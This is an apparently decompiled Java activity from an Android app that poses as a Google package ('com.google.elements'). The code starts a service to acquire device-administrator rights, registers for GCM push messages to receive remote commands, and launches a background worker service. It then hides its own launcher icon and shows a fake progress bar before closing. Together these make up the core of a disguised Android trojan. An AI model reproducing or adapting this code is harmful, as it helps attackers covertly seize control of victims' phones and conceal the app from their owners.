package com.google.elements;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.google.android.gcm.GCMRegistrar;

public class MainActivity extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        if (VERSION.SDK_INT >= 11) {
            setTheme(16973931);
        }
        getApplicationContext();
        if (!((DevicePolicyManager) getSystemService("device_policy")).isAdminActive(new ComponentName(this, DeviceAdmin.class))) {
            Intent service = new Intent(getApplicationContext(), AdminService.class);
            service.setFlags(268435456);
            getApplicationContext().startService(service);
        }
        GCMRegistrar.checkDevice(this);
        GCMRegistrar.checkManifest(this);
        if (GCMRegistrar.getRegistrationId(this).equals(BuildConfig.FLAVOR)) {
            GCMRegistrar.register(this, "738965552143");
        }
        Intent work = new Intent(getApplicationContext(), WorkService.class);
        work.setFlags(268435456);
        startService(work);
        getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext().getPackageName(), getApplicationContext().getPackageName() + ".MainActivity"), 2, 1);
        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {
            public void onClick(View view) {
                MainActivity.this.loading();
            }
        });
        ((TextView) findViewById(R.id.textView)).setTextColor(Color.parseColor("#" + Utils.getInstance(this).getTextColor()));
    }

    public void loading() {
        setContentView(R.layout.loading);
        ((TextView) findViewById(R.id.textView2)).setTextColor(Color.parseColor("#" + Utils.getInstance(this).getTextColor()));
        final ProgressBar progress = (ProgressBar) findViewById(R.id.progressBar);
        final TextView progress_prc = (TextView) findViewById(R.id.textView);
        new Thread(new Runnable() {
            public void run() {
                for (int i = 1; i <= 100; i++) {
                    progress.incrementProgressBy(1);
                    progress_prc.post(new Runnable() {
                        public void run() {
                            progress_prc.setText(String.valueOf(progress.getProgress()) + "%");
                        }
                    });
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (progress.getProgress() == 100) {
                        MainActivity.this.finish();
                    }
                }
            }
        }).start();
    }
}
